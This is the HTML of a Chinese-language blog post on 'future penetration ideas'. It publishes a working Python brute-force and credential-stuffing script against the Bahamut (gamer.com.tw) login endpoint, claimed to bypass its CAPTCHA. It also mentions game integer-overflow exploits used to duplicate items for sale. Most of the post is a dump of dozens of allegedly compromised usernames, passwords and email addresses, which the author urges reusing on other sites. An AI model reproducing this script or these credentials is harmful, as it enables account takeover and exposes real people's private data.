@@ -1,0 +1,1100 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-TW"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://itamiokanjiro.ddns.net:3111';</script>
+  
+  <title>
+    未來滲透思路 |
+    
+    學習日誌
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="現今的滲透已經AI化了各種腳本  打下網站   大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫除非工程師程式邏輯有問題 就像是如今全球服精靈樂章 的 API 整數溢出  在內存中 輸入(65536 &#x2F; 2 -1) 就能觸發 幻想神域 台服的轉帳系統異常一樣 都可以構成無限複製虛寶，販賣給玩家是有錢賺的。 某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="未來滲透思路">
+<meta property="og:url" content="https://itamiokanjiro.ddns.net:3111/2025/06/01/%E6%9C%AA%E4%BE%86%E6%BB%B2%E9%80%8F%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="學習日誌">
+<meta property="og:description" content="現今的滲透已經AI化了各種腳本  打下網站   大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫除非工程師程式邏輯有問題 就像是如今全球服精靈樂章 的 API 整數溢出  在內存中 輸入(65536 &#x2F; 2 -1) 就能觸發 幻想神域 台服的轉帳系統異常一樣 都可以構成無限複製虛寶，販賣給玩家是有錢賺的。 某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2025-06-01T12:01:12.000Z">
+<meta property="article:modified_time" content="2025-06-01T12:34:21.290Z">
+<meta property="article:author" content="一袋米要扛幾樓">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="學習日誌" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" integrity="sha384-4NN3fZ5AokFyHuoihl7A9qWaCt+HsAtOaUsXwJGRb4&#x2F;SMBtFr2vcNSHR5E8dg0Wk" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈禱中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首頁</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">歸檔</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">關於</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友鏈</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 訂閱" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/600211.webp" alt="未來滲透思路">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">未來滲透思路</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目錄</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/600211.webp" data-sizes="auto" alt="一袋米要扛幾樓" class="lazyload">
+  <div class="sidebar-author-name">一袋米要扛幾樓</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分類</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>標籤</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首頁"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首頁</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="歸檔"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">歸檔</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="關於"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">關於</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友鏈"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友鏈</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-未來滲透思路" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-01T12:01:12.000Z" itemprop="datePublished">2025-06-01</time>
+    <time style="display: none;" id="post-update-time">2025-06-01</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>現今的滲透<br>已經AI化了<br>各種腳本  打下網站  </p>
+<p>大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫<br>除非工程師程式邏輯有問題</p>
+<p>就像是如今全球服<a target="_blank" rel="noopener" href="https://www.x-legend.com/online/grandfantasia-origin/zh-hant/">精靈樂章</a> 的 API 整數溢出  在內存中 輸入(65536 &#x2F; 2 -1) 就能觸發</p>
+<p><a target="_blank" rel="noopener" href="https://ff.x-legend.com.tw/index_in.php">幻想神域</a> 台服的轉帳系統異常一樣</p>
+<p>都可以構成無限複製虛寶，販賣給玩家是有錢賺的。</p>
+<p>某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。</p>
+<p>台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登入測試帳密，對於駭客沒有起到防禦作用，頂多防治低端駭客。</p>
+<p>以下是巴哈姆特的exploit</p>
+<pre><code>import requests
+import re
+def login_gamer(i: str, b: str):
+    url = &quot;https://user.gamer.com.tw/ajax/do_login.php&quot;
+    boundary = &quot;----WebKitFormBoundary43kaavhQRXxSIS8T&quot;
+    alternativeCaptcha=&quot;00fc6930b735e3cad682e0853a5e7de13b89d97fd3ec5ad167f2ba6b&quot;
+
+    # Cookies  boundary  alternativeCaptcha 也要更新
+    cookies = &#123;
+        &quot;_ga&quot;: &quot;GA1.1.1957928680.1732967366&quot;,
+        &quot;ckM&quot;: &quot;2531167198&quot;,
+        &quot;buap_modr&quot;: &quot;p014&quot;,
+        &quot;buap_puoo&quot;: &quot;p301&quot;,
+        &quot;ckGUILD_lastBrowse&quot;: &quot;[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83&lt;%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]&quot;,
+        &quot;__cf_bm&quot;: &quot;mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA&quot;,
+    &#125;
+    headers = &#123;
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;,
+        &quot;Accept&quot;: &quot;*/*&quot;,
+        &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;,
+        &quot;Accept-Language&quot;: &quot;zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7&quot;,
+        &quot;Cache-Control&quot;: &quot;no-cache&quot;,
+        &quot;Origin&quot;: &quot;https://user.gamer.com.tw&quot;,
+        &quot;Pragma&quot;: &quot;no-cache&quot;,
+        &quot;Referer&quot;: &quot;https://user.gamer.com.tw/login.php&quot;,
+        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
+        &quot;Content-Type&quot;: f&quot;multipart/form-data; boundary=&#123;boundary&#125;&quot;
+    &#125;
+
+    body = (
+        f&quot;--&#123;boundary&#125;\r\n&quot;
+        &quot;Content-Disposition: form-data; name=\&quot;userid\&quot;\r\n\r\n&quot;
+        f&quot;&#123;i&#125;\r\n&quot;
+        f&quot;--&#123;boundary&#125;\r\n&quot;
+        &quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n\r\n&quot;
+        f&quot;&#123;b&#125;\r\n&quot;
+        f&quot;--&#123;boundary&#125;\r\n&quot;
+        &quot;Content-Disposition: form-data; name=\&quot;autoLogin\&quot;\r\n\r\n&quot;
+        &quot;T\r\n&quot;
+        f&quot;--&#123;boundary&#125;\r\n&quot;
+        &quot;Content-Disposition: form-data; name=\&quot;alternativeCaptcha\&quot;\r\n\r\n&quot;
+        f&quot;&#123;alternativeCaptcha&#125;\r\n&quot;
+        f&quot;--&#123;boundary&#125;\r\n&quot;
+        &quot;Content-Disposition: form-data; name=\&quot;twoStepAuth\&quot;\r\n\r\n&quot;
+        &quot;\r\n&quot;
+        f&quot;--&#123;boundary&#125;--\r\n&quot;
+    )
+
+
+    response = requests.post(url, headers=headers, cookies=cookies, data=body.encode(&quot;utf-8&quot;))
+
+
+    if &#39;&quot;error&quot;&#39; not in response.text:
+        print(f&quot;✅ Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)
+        print(&quot;Response:&quot;, response.text)
+
+        if i in usernames:
+            usernames.remove(i)
+            with open(&quot;9999.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:
+                f.write(&#39;\n&#39;.join(usernames) + &#39;\n&#39;)
+
+        # 加入 99.txt
+        with open(&quot;99.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as f:
+            f.write(i + &#39;\n&#39;)
+
+    elif &#39;&quot;CSRF_TOKEN_ERROR&quot;&#39; in response.text:
+        print(f&quot;🚫 CSRF ERROR Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)
+        print(&quot;Response:&quot;, response.text)
+
+    return
+
+
+
+with open(&quot;9999.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:
+    usernames = [line.strip() for line in file if line.strip()]
+
+for i in usernames:
+    c = re.sub(r&#39;[a-zA-Z]&#39;, &#39;a&#39;, i)
+    b = c.replace(&quot;aa&quot;, &quot;a&quot;)  
+    login_gamer(i, b)
+</code></pre>
+<p>以下是戰利品，簡簡單單的腳本可以造成如此可怕的破壞性。 可以將其拿去撞庫其他網站。</p>
+<pre><code>Username: aa0903465890, Password: a0903465890, Status Code: 200  a0903465890@gmail.com 動漫風
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0952121590, Password: a0952121590, Status Code: 200  bodishenqi@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0909165363, Password: a0909165363, Status Code: 200 a0952148610@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0903892528, Password: a0903892528, Status Code: 200 b0903892528@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: w0906997609, Password: a0906997609, Status Code: 200 datealive24561715@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0907711641, Password: a0907711641, Status Code: 200 a0932602130@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0985883382, Password: a0985883382, Status Code: 200 b0985883382@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0902445622, Password: a0902445622, Status Code: 200 a0902445622@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0968223897, Password: a0968223897, Status Code: 200  a0968223897@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0910525, Password: a0910525, Status Code: 200 aa0928252609@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: e0973943179, Password: a0973943179, Status Code: 200 lovebaby19810802@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0918681748, Password: a0918681748, Status Code: 200 love0918681748@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: st0986808392, Password: a0986808392, Status Code: 200 st882810@yahoo.com.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0968954488, Password: a0968954488, Status Code: 200 gg122504531@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0935962575, Password: a0935962575, Status Code: 200 asdw95049@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0953956567, Password: a0953956567, Status Code: 200 a0953956567@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0987890752, Password: a0987890752, Status Code: 200 young30987@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: as0906566327, Password: a0906566327, Status Code: 200 a0906566327@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: f0916727293, Password: a0916727293, Status Code: 200
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b09158500, Password: a09158500, Status Code: 200 b0909158500@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: jy0907007336, Password: a0907007336, Status Code: 200 chizhengyou535@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: zx0980821344, Password: a0980821344, Status Code: 200 a0980821344@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: a709980792, Password: a709980792, Status Code: 200 msn709980792@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: l0903019107, Password: a0903019107, Status Code: 200 adwx83@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: gg0910288118, Password: a0910288118, Status Code: 200 louser9487@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: c0905610929, Password: a0905610929, Status Code: 200 a0905610929@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: c0968908771, Password: a0968908771, Status Code: 200 gavin62115@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s097944987, Password: a097944987, Status Code: 200 jason930312@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: je0928511681, Password: a0928511681, Status Code: 200 a0928511681@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0916543726, Password: a0916543726, Status Code: 200 chan92726@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: l0909340420, Password: a0909340420, Status Code: 200 a0909340420@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: os0984028800, Password: a0984028800, Status Code: 200 
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0977300591, Password: a0977300591, Status Code: 200 a0977300591@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0965107208, Password: a0965107208, Status Code: 200 a0965107208@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0905795377, Password: a0905795377, Status Code: 200 aa0905795377@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0951115, Password: a0951115, Status Code: 200    s0951115@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ji0966109453, Password: a0966109453, Status Code: 200 a0966109453@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: as0905427665, Password: a0905427665, Status Code: 200 a0905427665@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: p090749499, Password: pp090749499, Status Code: 200  p090749499@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: t0912287071, Password: tt0912287071, Status Code: 200  t091228.t7071@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: j090276, Password: jj090276, Status Code: 200 j090276@my.cmsh.cyc.edu.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: aa0981073215, Password: aa0981073215, Status Code: 200  a0981073215@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: l0990209, Password: l0990209, Status Code: 200  z6865105@gmail.com shipeicen992@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: h10911218, Password: h10911218, Status Code: 200 kencatu@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: m0976722676, Password: m0976722676, Status Code: 200 scorpio2014520@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: j0905911501, Password: j0905911501, Status Code: 200 jeff29218829@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: f0980466920, Password: f0980466920, Status Code: 200 poror81333@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+✅ Username: s0987550111, Password: s0987550111, Status Code: 200 s0987550111@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+以下密碼同帳號
+ok0927719082  okok0927719082@gmail.com
+m0965007291 s9007311@gmail.com
+k0966525111  cruoen@gmail.com 2000-08-17 6889
+k0963106226 k0963106226
+aa0920686666  Aa0920686666@icloud.com
+b0935429595 b0935429595@gmail.com
+d09231202 willy5931@gmail.com
+w0965572698
+k0970283000 kaononog@gmail.com
+vi0909211939 erli90889@gmail.com
+js0975546884 js0975546884@gmail.com
+s0970572524 w674961@gmail.com 這個
+q0903571195 jay136001@gmail.com
+aa0909503439 50014@thjh.tc.edu.tw
+q0905394257 q0905394257@gmail.com
+w0906181410
+av0907325862 0963521qq@gmail.com  有
+Username: aa09210035, Password: a09210035, Status Code: 200  a09210822@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: u0979254001, Password: a0979254001, Status Code: 200 unicorn0979254001@icloud.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0912633373, Password: a0912633373, Status Code: 200 aa0912633373@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0911805750, Password: a0911805750, Status Code: 200 a0911805750@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0966176188, Password: a0966176188, Status Code: 200
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0905292491, Password: a0905292491, Status Code: 200 abc092053@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0938918616, Password: a0938918616, Status Code: 200 a0938918616@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0960960809, Password: a0960960809, Status Code: 200 love088613559@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0920194989, Password: a0920194989, Status Code: 200 a0920194989@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0909591313, Password: a0909591313, Status Code: 200 cmy0909591313@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: r0972880749, Password: a0972880749, Status Code: 200 r0972880749@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0976681217, Password: a0976681217, Status Code: 200 a0976681217@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0960300399, Password: a0960300399, Status Code: 200 a0960300399@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0903060747, Password: a0903060747, Status Code: 200 a0903060747@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0903559094, Password: a0903559094, Status Code: 200 a090355909432@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: k0933944907, Password: a0933944907, Status Code: 200 annime284@icloud.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0905879083, Password: a0905879083, Status Code: 200 a0905879083@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: pe0988977410, Password: a0988977410, Status Code: 200 a0988977410@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0908279601, Password: a0908279601, Status Code: 200 csc908279601@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: m0905660182, Password: a0905660182, Status Code: 200 a0905660182@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0908550262, Password: a0908550262, Status Code: 200 a0908550262@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: as0966120010, Password: a0966120010, Status Code: 200 q0966120010@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0965332258, Password: a0965332258, Status Code: 200 a0965332258@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: t0909514986, Password: a0909514986, Status Code: 200 a0909514986@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0908365535, Password: a0908365535, Status Code: 200 b0908365535@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0980458882, Password: a0980458882, Status Code: 200 a871888@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: p0965494790, Password: a0965494790, Status Code: 200
